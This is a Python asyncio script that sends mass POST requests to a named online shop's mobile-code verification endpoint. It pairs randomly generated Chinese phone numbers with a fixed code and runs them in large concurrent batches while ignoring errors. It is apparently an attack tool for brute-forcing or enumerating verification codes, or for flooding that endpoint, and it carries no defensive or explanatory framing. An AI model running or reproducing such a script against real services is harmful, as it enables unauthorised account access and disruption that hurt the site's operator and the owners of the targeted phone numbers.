import asyncio
import aiohttp
async def fetch(session, url,mobile):
    params = {'mobile': mobile, 'code': '1223'}
    async with session.post(url,params=params) as response:
        return await response.text()

async def main(mobile):
    async with aiohttp.ClientSession() as session:
        html = await fetch(session, 'http://shop.chaojiyuding.com/web/hotelmerchant.php?c=site&a=entry&i=2&m=ewei_shopv2&do=web&r=login.checkmobilecode',mobile)
        print(html)

import random
def gen_mobile():
    first_part = [189,133,159,177,181,134,135,136,137,138,139,147,150,151,152,157,158,159,178,182,183,184,187,188]
    first_str = ""
    for i in range(len(first_part)):
        first_str = first_part[random.randint(0,len(first_part)-1)]

    second_part = ''
    for i in range(8):
        second_part+= str(random.randint(0,9))

    final_str = str(first_str)+second_part
    return final_str


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    tasks = []
    for i in range(10000):
        try:
            for i in range(100):
                tasks.append(main(gen_mobile()))
            loop.run_until_complete(asyncio.wait(tasks))
        except Exception:
            continue
    # for i in range(10):
    #     print(gen_mobile())



